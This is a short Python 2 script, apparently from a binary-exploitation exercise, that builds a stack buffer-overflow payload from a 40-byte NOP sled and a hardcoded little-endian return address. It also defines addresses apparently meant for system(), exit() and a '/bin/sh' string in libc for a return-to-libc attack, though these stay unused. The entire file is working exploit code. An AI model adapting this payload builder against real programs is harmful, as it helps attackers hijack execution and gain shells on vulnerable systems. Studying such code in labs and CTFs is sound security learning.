nops = '\x90'*40
ret = '0x7fffffffce9c'
sys = '0x7ffff7dfdff0'
ex = '0x7ffff7df3840'
sh = str(0x00007ffff7ddc000 + 0x183cee)
return_addr = (ret[2:].decode('hex'))[::-1]  
payload = nops + return_addr
print(payload)